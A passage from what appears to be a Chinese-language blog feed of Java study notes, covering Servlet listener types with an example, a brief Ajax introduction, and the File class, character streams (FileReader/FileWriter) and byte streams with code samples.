class="string">&quot;应用域销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="功能总结"><a href="#功能总结" class="headerlink" title="功能总结"></a>功能总结</h3><p><strong>注意：</strong>任何一个会话的相应变化都会触发会话监听器的相应操作；任何一个请求的相应变化都会触发请求监听器的相应操作</p>
<table>
<thead>
<tr>
<th><strong>监听器类型</strong></th>
<th><strong>监听对象</strong></th>
<th><strong>监听事件</strong></th>
<th><strong>功能描述</strong></th>
<th><strong>应用场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>ServletContextListener</strong></td>
<td>ServletContext</td>
<td>应用启动 (<code>contextInitialized</code>)</td>
<td>在Web应用程序启动时执行初始化操作</td>
<td>初始化全局资源（如数据库连接池、缓存）</td>
</tr>
<tr>
<td></td>
<td></td>
<td>应用关闭 (<code>contextDestroyed</code>)</td>
<td>在Web应用程序关闭时执行清理操作</td>
<td>释放资源</td>
</tr>
<tr>
<td><strong>HttpSessionListener</strong></td>
<td>HttpSession</td>
<td>会话创建 (<code>sessionCreated</code>)</td>
<td>当一个新的会话被创建时触发</td>
<td>跟踪在线用户数量</td>
</tr>
<tr>
<td></td>
<td></td>
<td>会话销毁 (<code>sessionDestroyed</code>)</td>
<td>当一个会话被销毁时触发</td>
<td>清理过期的会话数据</td>
</tr>
<tr>
<td><strong>ServletRequestListener</strong></td>
<td>ServletRequest</td>
<td>请求创建 (<code>requestInitialized</code>)</td>
<td>当一个新的请求到达服务器时触发</td>
<td>记录请求日志、统计请求次数</td>
</tr>
<tr>
<td></td>
<td></td>
<td>请求销毁 (<code>requestDestroyed</code>)</td>
<td>当请求处理完成并返回响应时触发</td>
<td>记录请求结束时间</td>
</tr>
<tr>
<td><strong>ServletContextAttributeListener</strong></td>
<td>ServletContext</td>
<td>属性添加 (<code>attributeAdded</code>)</td>
<td>当向<code>ServletContext</code>中添加属性时触发</td>
<td>监控全局配置的变化</td>
</tr>
<tr>
<td></td>
<td></td>
<td>属性移除 (<code>attributeRemoved</code>)</td>
<td>当从<code>ServletContext</code>中移除属性时触发</td>
<td>清理不再需要的全局配置</td>
</tr>
<tr>
<td></td>
<td></td>
<td>属性替换 (<code>attributeReplaced</code>)</td>
<td>当替换<code>ServletContext</code>中的属性值时触发</td>
<td>更新全局配置</td>
</tr>
<tr>
<td><strong>HttpSessionAttributeListener</strong></td>
<td>HttpSession</td>
<td>属性添加 (<code>attributeAdded</code>)</td>
<td>当向<code>HttpSession</code>中添加属性时触发</td>
<td>监控会话状态变化</td>
</tr>
<tr>
<td></td>
<td></td>
<td>属性移除 (<code>attributeRemoved</code>)</td>
<td>当从<code>HttpSession</code>中移除属性时触发</td>
<td>清理会话数据</td>
</tr>
<tr>
<td></td>
<td></td>
<td>属性替换 (<code>attributeReplaced</code>)</td>
<td>当替换<code>HttpSession</code>中的属性值时触发</td>
<td>更新会话数据</td>
</tr>
<tr>
<td><strong>ServletRequestAttributeListener</strong></td>
<td>ServletRequest</td>
<td>属性添加 (<code>attributeAdded</code>)</td>
<td>当向<code>ServletRequest</code>中添加属性时触发</td>
<td>监控请求范围内的数据变化</td>
</tr>
<tr>
<td></td>
<td></td>
<td>属性移除 (<code>attributeRemoved</code>)</td>
<td>当从<code>ServletRequest</code>中移除属性时触发</td>
<td>清理请求范围内的数据</td>
</tr>
<tr>
<td></td>
<td></td>
<td>属性替换 (<code>attributeReplaced</code>)</td>
<td>当替换<code>ServletRequest</code>中的属性值时触发</td>
<td>更新请求范围内的数据</td>
</tr>
<tr>
<td><strong>HttpSessionBindingListener</strong></td>
<td>HttpSession</td>
<td>对象绑定 (<code>valueBound</code>)</td>
<td>当对象被绑定到<code>HttpSession</code>时触发</td>
<td>自定义对象在会话中的行为</td>
</tr>
<tr>
<td></td>
<td></td>
<td>对象解绑 (<code>valueUnbound</code>)</td>
<td>当对象从<code>HttpSession</code>中解绑时触发</td>
<td>清理对象资源</td>
</tr>
<tr>
<td><strong>HttpSessionActivationListener</strong></td>
<td>HttpSession</td>
<td>会话钝化 (<code>sessionWillPassivate</code>)</td>
<td>当会话即将被钝化（序列化保存）时触发</td>
<td>准备会话数据以便存储</td>
</tr>
<tr>
<td></td>
<td></td>
<td>会话激活 (<code>sessionDidActivate</code>)</td>
<td>当会话从钝化状态恢复（反序列化加载）时触发</td>
<td>恢复会话数据</td>
</tr>
</tbody></table>
<p><strong>说明</strong></p>
<ul>
<li><strong>ServletContextListener</strong>：用于监听整个Web应用的生命周期事件。</li>
<li><strong>HttpSessionListener</strong>：用于监听用户的会话创建和销毁事件。</li>
<li><strong>ServletRequestListener</strong>：用于监听每个HTTP请求的创建和销毁事件。</li>
<li><strong>ServletContextAttributeListener</strong>：用于监听<code>ServletContext</code>中属性的变化。</li>
<li><strong>HttpSessionAttributeListener</strong>：用于监听<code>HttpSession</code>中属性的变化。</li>
<li><strong>ServletRequestAttributeListener</strong>：用于监听<code>ServletRequest</code>中属性的变化。</li>
<li><strong>HttpSessionBindingListener</strong>：允许对象在其被绑定或解绑到<code>HttpSession</code>时执行自定义逻辑。</li>
<li><strong>HttpSessionActivationListener</strong>：用于处理会话的钝化（passivation）和激活（activation）过程。</li>
</ul>
<h3 id="应用示例"><a href="#应用示例" class="headerlink" title="应用示例"></a>应用示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletContextAttributeListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeAdded</span><span class="params">(ServletContextAttributeEvent scae)</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">app</span> <span class="operator">=</span> scae.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> scae.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String) scae.getValue();</span><br><span class="line"></span><br><span class="line">        System.out.println(app.hashCode()+<span class="string">&quot;应用域增加了: &quot;</span>+key+<span class="string">&quot;=&quot;</span>+value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeRemoved</span><span class="params">(ServletContextAttributeEvent scae)</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">app</span> <span class="operator">=</span> scae.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> scae.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String) scae.getValue();</span><br><span class="line"></span><br><span class="line">        System.out.println(app.hashCode()+<span class="string">&quot;应用域删除了: &quot;</span>+key+<span class="string">&quot;=&quot;</span>+value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attributeReplaced</span><span class="params">(ServletContextAttributeEvent scae)</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">app</span> <span class="operator">=</span> scae.getServletContext();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> scae.getName();</span><br><span class="line">        <span class="comment">// getValue()方法获取的是修改前的值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String) scae.getValue();</span><br><span class="line">        <span class="comment">// 新值需要从应用域直接获取</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">newValue</span> <span class="operator">=</span> (String) app.getAttribute(key);</span><br><span class="line">        System.out.println(app.hashCode()+<span class="string">&quot;应用域修改了: &quot;</span>+key+<span class="string">&quot;=&quot;</span>+value+<span class="string">&quot; ==&gt; &quot;</span>+key+<span class="string">&quot;=&quot;</span>+newValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><p><strong>AJAX（Asynchronous JavaScript and XML）</strong> 是一种用于创建快速动态网页的技术。它允许在不重新加载整个页面的情况下，通过异步方式与服务器交换数据并更新部分网页内容。AJAX的核心理念是使网页更加交互和响应迅速，从而提升用户体验。</p>
<p><strong>AJAX 的工作原理：</strong></p>
<ol>
<li><strong>发起请求</strong>：<ul>
<li>使用JavaScript的<code>XMLHttpRequest</code>对象或现代的<code>fetch</code> API向服务器发送异步请求。</li>
</ul>
</li>
<li><strong>处理响应</strong>：<ul>
<li>服务器处理请求并返回数据（通常是JSON、XML或纯文本格式）。</li>
<li>客户端接收到响应后，使用JavaScript解析并更新网页的部分内容，而不需要刷新整个页面。</li>
</ul>
</li>
<li><strong>更新页面</strong>：<ul>
<li>根据服务器返回的数据，动态更新DOM（文档对象模型），以反映最新的信息。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>前端技术</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
        <tag>会话</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Note4-IO网络反射</title>
    <url>/2024/07/15/Java-Note4-IO%E7%BD%91%E7%BB%9C%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<p>file类和io流 网络编程 反射机制 jdk8-17新特性</p>
<span id="more"></span>

<p><a href="https://www.bilibili.com/video/BV1PY411e7J6/?p=15&spm_id_from=pageDriver&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-java基础教程</a><br><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程-java</a><br><a href="https://www.runoob.com/manual/jdk11api/index.html">Java API 参考文档</a><br>参考书籍:《java核心技术》《Effective Java》 《java编程思想》</p>
<hr>
<h2 id="file类和io流-网络编程-反射机制-jdk8-17新特性"><a href="#file类和io流-网络编程-反射机制-jdk8-17新特性" class="headerlink" title="file类和io流 网络编程 反射机制 jdk8-17新特性"></a>file类和io流 网络编程 反射机制 jdk8-17新特性</h2><h3 id="第15章-File类与IO流"><a href="#第15章-File类与IO流" class="headerlink" title="第15章_File类与IO流"></a>第15章_File类与IO流</h3><p>本章中涉及的相关流均在java.io包下</p>
<h4 id="File类的使用"><a href="#File类的使用" class="headerlink" title="File类的使用"></a>File类的使用</h4><ul>
<li>一个File对象代表硬盘或网络中可能存在的一个文件或者文件目录（俗称文件夹），与平台无关。（体会万事万物皆对象）</li>
<li>File 能新建、删除、重命名文件和目录，但 File <strong>不能访问文件内容本身</strong>。如果需要访问文件内容本身，则需要使用输入&#x2F;输出流。</li>
<li>File对象可以作为参数传递给流的构造器。</li>
<li>想要在Java程序中表示一个真实存在的文件或目录，那么必须有一个File对象，但是Java程序中的一个File对象，可能没有一个真实存在的文件或目录。</li>
</ul>
<p><strong>构造器</strong></p>
<ul>
<li><code>public File(String pathname) </code> ：以pathname为路径创建File对象，可以是绝对路径或者相对路径，如果pathname是相对路径，则默认的当前路径在系统属性user.dir中存储。</li>
<li><code>public File(String parent, String child) </code> ：以parent为父路径，child为子路径创建File对象。</li>
<li><code>public File(File parent, String child)</code> ：根据一个父File对象和子文件路径创建File对象</li>
</ul>
<p>关于路径：</p>
<ul>
<li><strong>绝对路径：</strong>从盘符开始的路径，这是一个完整的路径。</li>
<li><strong>相对路径：</strong>相对于<code>项目目录</code>的路径，这是一个便捷的路径，开发中经常使用。<ul>
<li>IDEA中，main中的文件的相对路径，是相对于”<code>当前工程</code>“</li>
<li>IDEA中，单元测试方法中的文件的相对路径，是相对于”<code>当前module</code>“</li>
</ul>
</li>
</ul>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造器1</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;test&quot;</span>); <span class="comment">// 文件目录对象，采用相对路径</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/test\\a.txt&quot;</span>); <span class="comment">//有后缀名，为文件，绝对路径</span></span><br><span class="line"><span class="comment">// 构造器2</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/test&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">file3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/test&quot;</span>,<span class="string">&quot;a.txt&quot;</span>);<span class="comment">//第一个参数必须是文件目录，第二个可以是文件目录或文件</span></span><br><span class="line"><span class="comment">// 构造器3</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file,<span class="string">&quot;a.txt&quot;</span>);<span class="comment">//第一个参数必须是文件目录，第二个可以是文件目录或文件</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ol>
<li>无论该路径下是否存在文件或者目录，都不影响File对象的创建。</li>
<li>window的路径分隔符使用“\”，而Java程序中的“\”表示转义字符，所以在Windows中表示路径，需要用“\”。或者直接使用“&#x2F;”也可以，Java程序支持将“&#x2F;”当成平台无关的<code>路径分隔符</code>。或者直接使用File.separator常量值表示。比如：<br>File file2 &#x3D; new File(“d:” + File.separator + “atguigu” + File.separator + “info.txt”);</li>
<li>当构造路径是绝对路径时，那么getPath和getAbsolutePath结果一样<br>当构造路径是相对路径时，那么getAbsolutePath的路径 &#x3D; user.dir的路径 + 构造路径</li>
</ol>
<p><strong>常用方法</strong></p>
<ol>
<li>获取文件和目录基本信息<ul>
<li>public String getName() ：获取名称</li>
<li>public String getPath() ：获取路径</li>
<li><code>public String getAbsolutePath()</code>：获取绝对路径</li>
<li>public File getAbsoluteFile()：获取绝对路径表示的文件</li>
<li><code>public String getParent()</code>：获取上层文件目录路径。若无，返回null</li>
<li>public long length() ：获取文件长度（即：字节数）。<em>不能获取目录的长度</em>。</li>
<li>public long lastModified() ：获取最后一次的修改时间，毫秒值</li>
</ul>
</li>
<li>列出目录的下一级<ul>
<li>public String[] list() ：返回一个String数组，表示该File目录中的所有子文件或目录。</li>
<li>public File[] listFiles() ：返回一个File数组，表示该File目录中的所有的子文件或目录。</li>
</ul>
</li>
<li>File类的重命名功能<ul>
<li>public boolean renameTo(File dest):把文件重命名为指定的文件路径。<br>调用的File对象对应文件必须存在且重命名的文件路径不存在文件</li>
</ul>
</li>
<li>判断功能的方法<ul>
<li><code>public boolean exists()</code> ：此File表示的文件或目录是否实际存在。</li>
<li><code>public boolean isDirectory()</code> ：此File表示的是否为目录。</li>
<li><code>public boolean isFile()</code> ：此File表示的是否为文件。</li>
<li>public boolean canRead() ：判断是否可读</li>
<li>public boolean canWrite() ：判断是否可写</li>
<li>public boolean isHidden() ：判断是否隐藏</li>
</ul>
</li>
<li>创建、删除功能<ul>
<li><code>public boolean createNewFile()</code> ：创建文件。若文件存在，则不创建，返回false。</li>
<li><code>public boolean mkdir()</code> ：创建文件目录。如果此文件目录存在，就不创建了。如果此文件目录的上层目录不存在，也不创建。</li>
<li><code>public boolean mkdirs()</code> ：创建文件目录。如果上层文件目录不存在，一并创建。</li>
<li><code>public boolean delete()</code> ：删除文件或者文件夹<br>删除注意事项：① Java中的删除不走回收站。② 要删除一个文件目录，请注意该文件目录内不能包含文件或者文件目录。</li>
</ul>
</li>
</ol>
<h4 id="IO流概述"><a href="#IO流概述" class="headerlink" title="IO流概述"></a>IO流概述</h4><p>Java程序中，对于数据的输入&#x2F;输出操作以“<code>流(stream)</code>” 的方式进行，可以看做是一种数据的流动。<br>I&#x2F;O流中的I&#x2F;O是<code>Input/Output</code>的缩写， I&#x2F;O技术是非常实用的技术，用于处理设备之间的数据传输。如读&#x2F;写文件，网络通讯等。</p>
<ul>
<li><code>输入input</code>：读取外部数据（磁盘、光盘等存储设备的数据）到程序（内存）中。</li>
<li><code>输出output</code>：将程序（内存）数据输出到磁盘、光盘等存储设备中。</li>
</ul>
<p><strong>流的分类</strong><br><code>java.io</code>包下提供了各种“流”类和接口，用以获取不同种类的数据，并通过<code>标准的方法</code>输入或输出数据。</p>
<ul>
<li>按数据的流向不同分为：<strong>输入流</strong>和<strong>输出流</strong>。<ul>
<li><strong>输入流</strong> ：把数据从<code>其他设备</code>上读取到<code>内存</code>中的流。 <ul>
<li>以InputStream、Reader结尾</li>
</ul>
</li>
<li><strong>输出流</strong> ：把数据从<code>内存</code> 中写出到<code>其他设备</code>上的流。<ul>
<li>以OutputStream、Writer结尾</li>
</ul>
</li>
</ul>
</li>
<li>按操作数据单位的不同分为：<strong>字节流（8bit）</strong>和<strong>字符流（16bit）</strong>。<ul>
<li><strong>字节流</strong> ：以字节为单位，读写数据的流。<ul>
<li>以InputStream、OutputStream结尾</li>
</ul>
</li>
<li><strong>字符流</strong> ：以字符为单位，读写数据的流。<ul>
<li>以Reader、Writer结尾</li>
</ul>
</li>
</ul>
</li>
<li>根据IO流的角色不同分为：<strong>节点流</strong>和<strong>处理流</strong>。<ul>
<li><strong>节点流</strong>：直接从数据源或目的地读写数据<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240719224715.png" alt="节点流"></li>
<li><strong>处理流</strong>：不直接连接到数据源或目的地，而是“连接”在已存在的流（节点流或处理流）之上，通过对数据的处理为程序提供更为强大的读写功能。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240719224617.png" alt="处理流"></li>
</ul>
</li>
</ul>
<p><strong>流的API</strong></p>
<ul>
<li>Java的IO流共涉及40多个类，实际上非常规则，都是从如下4个抽象基类派生的。<table>
<thead>
<tr>
<th>（抽象基类）</th>
<th>输入流</th>
<th>输出流</th>
</tr>
</thead>
<tbody><tr>
<td>字节流</td>
<td>InputStream</td>
<td>OutputStream</td>
</tr>
<tr>
<td>字符流</td>
<td>Reader</td>
<td>Writer</td>
</tr>
</tbody></table>
</li>
<li>由这四个类派生出来的子类名称都是以其父类名作为子类名后缀。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240719173502.png" alt="IO流"></li>
</ul>
<p><strong>常用的节点流：</strong> 　</p>
<ul>
<li>文件流： FileInputStream、FileOutputStrean、FileReader、FileWriter </li>
<li>字节&#x2F;字符数组流： ByteArrayInputStream、ByteArrayOutputStream、CharArrayReader、CharArrayWriter <ul>
<li>对数组进行处理的节点流（对应的不再是文件，而是内存中的一个数组）。</li>
</ul>
</li>
</ul>
<p><strong>常用处理流：</strong></p>
<ul>
<li>缓冲流：BufferedInputStream、BufferedOutputStream、BufferedReader、BufferedWriter<ul>
<li>作用：增加缓冲功能，避免频繁读写硬盘，进而提升读写效率。</li>
</ul>
</li>
<li>转换流：InputStreamReader、OutputStreamReader<ul>
<li>作用：实现字节流和字符流之间的转换。</li>
</ul>
</li>
<li>对象流：ObjectInputStream、ObjectOutputStream<ul>
<li>作用：提供直接读写Java对象功能</li>
</ul>
</li>
</ul>
<h4 id="字符输入输出流-Reader-Writer"><a href="#字符输入输出流-Reader-Writer" class="headerlink" title="字符输入输出流 Reader &amp;&amp; Writer"></a>字符输入输出流 Reader &amp;&amp; Writer</h4><p>Java提供一些字符流类，以字符为单位读写数据，专门用于处理文本文件。不能操作图片，视频等非文本文件。<br>常见的文本文件有如下的格式：.txt、.java、.c、.cpp、.py等<br>注意：.doc、.xls、.ppt这些都不是文本文件。</p>
<p><code>java.io.Reader</code>抽象类是表示用于读取字符流的所有类的父类，可以读取字符信息到内存中。它定义了字符输入流的基本共性功能方法。</p>
<p><strong>Reader方法</strong></p>
<ul>
<li><code>public int read()</code>： 从输入流读取一个字符。 虽然读取了一个字符，但是会自动提升为int类型。返回该字符的Unicode编码值。如果已经到达流末尾了，则返回-1。</li>
<li><code>public int read(char[] cbuf)</code>： 从输入流中读取一些字符，并将它们存储到字符数组 cbuf中 。每次最多读取cbuf.length个字符。返回实际读取的字符个数。如果已经到达流末尾，没有数据可读，则返回-1。 </li>
<li><code>public int read(char[] cbuf,int off,int len)</code>：从输入流中读取一些字符，并将它们存储到字符数组 cbuf中，从cbuf[off]开始的位置存储。每次最多读取len个字符。返回实际读取的字符个数。如果已经到达流末尾，没有数据可读，则返回-1。 </li>
<li><code>public void close()</code> ：关闭此流并释放与此流相关联的任何系统资源。<br> 注意：当完成流的操作时，必须调用close()方法，释放系统资源，否则会造成内存泄漏。</li>
</ul>
<p><code>java.io.Writer </code>抽象类是表示用于写出字符流的所有类的超类，将指定的字符信息写出到目的地。它定义了字节输出流的基本共性功能方法。</p>
<p><strong>Writer方法</strong></p>
<ul>
<li><code>public void write(int c)</code> ：写出单个字符。</li>
<li><code>public void write(char[] cbuf) </code>：写出字符数组。 </li>
<li><code>public void write(char[] cbuf, int off, int len) </code>：写出字符数组的某一部分。off：数组的开始索引；len：写出的字符个数。 </li>
<li><code>public void write(String str) </code>：写出字符串。 </li>
<li><code>public void write(String str, int off, int len)</code> ：写出字符串的某一部分。off：字符串的开始索引；len：写出的字符个数。</li>
<li><code>public void flush() </code>：刷新该流的缓冲。  </li>
<li><code>public void close()</code> ：关闭此流。<br> 注意：当完成流的操作时，必须调用close()方法，释放系统资源，否则会造成内存泄漏。</li>
</ul>
<p>因为内置缓冲区的原因，如果FileWriter不关闭输出流，无法写出字符到文件中。但是关闭的流对象，是无法继续写出数据的。如果我们既想写出数据，又想继续使用流，就需要<code>flush()</code> 方法了。</p>
<ul>
<li><code>flush()</code> ：刷新缓冲区，流对象可以继续使用。</li>
<li><code>close() </code>：先刷新缓冲区，然后通知系统释放资源。流对象不可以再被使用了。<br>注意：即便是flush()方法写出了数据，操作的最后还是要调用close方法，释放系统资源。<blockquote>
<p>在向文件写入数据时，如果不调用 flush()，数据可能会暂时留在内存中的缓冲区里，直到缓冲区满了或者流被关闭时才真正写入文件。这在某些需要即时写入数据的场景下是不可接受的，因此可以通过调用 flush() 方法来强制将缓冲区中的数据写出。</p>
</blockquote>
</li>
</ul>
<h5 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h5><p><code>java.io.FileReader </code>类用于读取字符文件，构造时使用系统默认的字符编码和默认字节缓冲区。</p>
<p><strong>构造器</strong></p>
<ul>
<li><code>FileReader(File file)</code>： 创建一个新的 FileReader ，给定要读取的File对象。   </li>
<li><code>FileReader(String fileName)</code>： 创建一个新的 FileReader ，给定要读取的文件的名称。</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//1 创建File类对象，对应文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\test\\a.txt&quot;</span>);</span><br><span class="line">        <span class="comment">//2 创建输入型字符流，用于读取数据</span></span><br><span class="line">        fileReader = <span class="keyword">new</span> <span class="title class_">FileReader</span>(file);</span><br><span class="line">        <span class="comment">//3 读取数据，显示在控制台</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> fileReader.read();</span><br><span class="line">        <span class="keyword">while</span>(data != -<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println((<span class="type">char</span>)data);</span><br><span class="line">            data= fileReader.read();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 等价</span></span><br><span class="line">        <span class="comment">// int data;</span></span><br><span class="line">        <span class="comment">// while(data  = fileReader.read() != -1)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println((char)data);</span></span><br><span class="line">        <span class="comment">//     data= fileReader.read();</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// 使用read(char[] cbuf) 加快速度</span></span><br><span class="line">        <span class="comment">// char[] cbuffer = new char[5];</span></span><br><span class="line">        <span class="comment">// int len</span></span><br><span class="line">        <span class="comment">// while((len = fr.read(cbuffer))!=-1)&#123;</span></span><br><span class="line">        <span class="comment">// for(int i=0;i&lt;len;i++&#123;System.out.println(cbuffer[i]);&#125;)</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(fileReader!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//4 流资源的关闭！！必须关闭，否则可能导致内存泄漏</span></span><br><span class="line">                fileReader.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h5 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h5><p><code>java.io.FileWriter </code>类用于写出字符到文件，构造时使用系统默认的字符编码和默认字节缓冲区。</p>
<p><strong>构造器</strong></p>
<ul>
<li><code>FileWriter(File file)</code>： 创建一个新的 FileWriter，给定要读取的File对象。   </li>
<li><code>FileWriter(String fileName)</code>： 创建一个新的 FileWriter，给定要读取的文件的名称。  </li>
<li><code>FileWriter(File file,boolean append)</code>： 创建一个新的 FileWriter，指明是否在现有文件末尾追加内容。</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//1 创建File类对象，对应文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\workinenglish\\test\\a.txt&quot;</span>);</span><br><span class="line">        <span class="comment">//2 创建输出型字符流，用于输出数据，覆盖写入</span></span><br><span class="line">        <span class="comment">//fileWriter = new FileWriter(file);</span></span><br><span class="line">        <span class="comment">//追加写入</span></span><br><span class="line">        fileWriter = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 输出数据</span></span><br><span class="line">        fileWriter.write(<span class="string">&quot;I an Tom&quot;</span>);</span><br><span class="line">        fileWriter.write(<span class="string">&quot;我是汤姆猫&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(fileWriter!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//4 流资源的关闭！！必须关闭，否则可能导致内存泄漏</span></span><br><span class="line">                fileWriter.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong> </p>
<ol>
<li>因为出现流资源的调用，为了避免内存泄漏，需要使用try-catch-finally处理异常</li>
<li><ul>
<li>对于输入流来说，File类的对象必须在物理磁盘上存在，否则执行就会报FileNotFoundException。如果传入的是一个目录，则会报IOException异常。</li>
<li>对于输出流来说，File类的对象是可以不存在的。<blockquote>
<p>如果File类的对象不存在，则可以在输出的过程中，自动创建File类的对象<br>如果File类的对象存在，<br>如果调用FileWriter(File file)或FileWriter(File file,false)，输出时会新建File文件覆盖已有的文件<br>如果调用FileWriter(File file,true)构造器，则在现有的文件末尾追加写出内容。</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<h4 id="字节输入输出流-InputStream-OutputStream"><a href="#字节输入输出流-InputStream-OutputStream" class="headerlink" title="字节输入输出流 InputStream &amp; OutputStream"></a>字节输入输出流 InputStream &amp; OutputStream</h4><p>读取或写出的数据是非文本文件，必须使用字节流;字节流也可以处理文本文件<br>exp: .doc .xls .jpg .pdf .mp3 .mp4 .avi</p>
<p><strong>字节输入流：InputStream</strong><br><code>java.io.InputStream </code>抽象类是表示字节输入流的所有类的超类，可以读取字节信息到内存中。它定义了字节输入流的基本共性功能方法。</p>
<ul>
<li><code>public int read()</code>： 从输入流读取一个字节。返回读取的字节值。虽然读取了一个字节，但是会自动提升为int类型。如果已经到达流末尾，没有数据可读，则返回-1。 </li>
<li><code>public int read(byte[] b)</code>： 从输入流中读取一些字节数，并将它们存储到字节数组 b中 。每次最多读取b.length个字节。返回实际读取的字节个数。如果已经到达流末尾，没有数据可读，则返回-1。 </li>
